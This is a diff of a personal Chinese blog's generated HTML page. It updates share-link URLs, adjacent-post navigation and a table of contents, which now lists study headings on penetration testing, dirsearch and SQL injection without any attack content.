     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hanfengscholar.github.io/023/04/26/Java%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hanfengscholar.github.io/024/11/08/%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -398,18 +465,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2023/04/26/Markdown/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2024/11/08/CTF/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Markdown
+          CTF基础（非常非常基础）
         
       </div>
     </a>
   
   
-    <a href="/2023/04/25/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">欢迎韩枫和韩枫的小伙伴们</div>
+    <a href="/2023/10/30/python/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">python</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -436,7 +503,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">Java学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2023%E5%B9%B42%E6%9C%8817%E6%97%A5-4%E6%9C%882%E6%97%A5%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">2023年2月17日-4月2日：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 前言：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Java%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. Java开发工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-cmd%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.3.</span> <span class="toc-text">3. cmd命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-java%E5%B7%A5%E5%85%B7Notepad"><span class="toc-number">1.1.4.</span> <span class="toc-text">4. java工具Notepad</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D%E9%BB%98%E8%AE%A4%E8%A7%84%E5%88%99"><span class="toc-number">1.1.5.</span> <span class="toc-text">5. 变量命名默认规则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%AF%BC%E5%8C%85%E7%B1%BB%EF%BC%88%E8%BF%99%E9%87%8CScanner%E4%B8%BA%E4%BE%8B%E5%AD%90%EF%BC%89"><span class="toc-number">1.1.6.</span> <span class="toc-text">6. 导包类（这里Scanner为例子）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%AF%AD%E6%B3%95%EF%BC%88%E4%B8%8EC%E7%B1%BB%E4%BC%BC%EF%BC%8C-%E7%94%B1%E4%BA%8E%E6%98%AF%E7%BB%99%E8%87%AA%E5%B7%B1%E7%9C%8B%E7%9A%84%EF%BC%8C-%E5%8F%AA%E5%86%99%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%EF%BC%89"><span class="toc-number">1.1.7.</span> <span class="toc-text">7. 语法（与C类似， 由于是给自己看的， 只写不一样的）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%9E%84%E9%80%A0%E5%99%A8"><span class="toc-number">1.1.8.</span> <span class="toc-text">8. 构造器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E7%BB%A7%E6%89%BF"><span class="toc-number">1.1.9.</span> <span class="toc-text">9. 继承</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%8E%A5%E5%8F%A3-interface"><span class="toc-number">1.1.10.</span> <span class="toc-text">10. 接口(interface)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E5%A4%9A%E6%80%81"><span class="toc-number">1.1.11.</span> <span class="toc-text">11. 多态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-number">1.1.12.</span> <span class="toc-text">12. 内部类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-%E5%BC%82%E5%B8%B8"><span class="toc-number">1.1.13.</span> <span class="toc-text">13. 异常</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Exception%E5%88%86%E4%B8%BA%EF%BC%9A"><span class="toc-number">1.1.13.0.1.</span> <span class="toc-text">Exception分为：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E7%9A%84%E4%BD%9C%E7%94%A8%EF%BC%9A"><span class="toc-number">1.1.13.0.2.</span> <span class="toc-text">异常的作用：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%82%E5%B8%B8%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">1.1.13.0.3.</span> <span class="toc-text">异常的处理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8"><span class="toc-number">1.1.13.0.4.</span> <span class="toc-text">自定义异常</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E5%87%BD%E6%95%B0%E7%8E%AF%E8%8A%82"><span class="toc-number">1.1.14.</span> <span class="toc-text">14. 函数环节</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E7%94%B1%E4%BA%8E%E5%90%83%E8%BF%87%E4%BA%8F%EF%BC%8C%E5%9B%A0%E6%AD%A4%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8B%EF%BC%89"><span class="toc-number">1.1.15.</span> <span class="toc-text">14.  其他知识点（由于吃过亏，因此记录一下）</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">1.1.</span> <span class="toc-text">渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dirsearch"><span class="toc-number">1.2.</span> <span class="toc-text">dirsearch:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">网络攻击与防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E8%AE%B2%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">sql注入讲解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">课堂实践</span></a></li></ol></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
